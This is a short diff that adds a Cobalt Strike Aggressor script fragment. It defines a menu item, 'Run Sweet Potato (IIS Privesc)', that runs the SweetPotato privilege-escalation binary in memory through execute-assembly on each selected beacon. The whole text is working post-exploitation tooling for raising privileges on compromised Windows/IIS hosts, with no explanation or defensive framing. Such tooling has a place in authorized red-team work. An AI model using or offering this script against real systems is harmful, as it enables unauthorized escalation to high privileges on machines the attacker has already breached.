@@ -1,0 +1,21 @@
+#################################################
+
+#   Run Sweep Potato (IIS Privesc)
+
+#################################################
+item "Run Sweet Potato (IIS Privesc)"{
+	local('$bid');
+		foreach $bid ($1){
+			sweetpotato($bid);
+		}
+	}
+
+
+#################################################
+
+#   Run Sweep Potato (IIS Privesc)
+
+#################################################
+sub sweetpotato{
+bexecute_assembly($1, script_resource('exe/SweetPotato.exe'));
+}
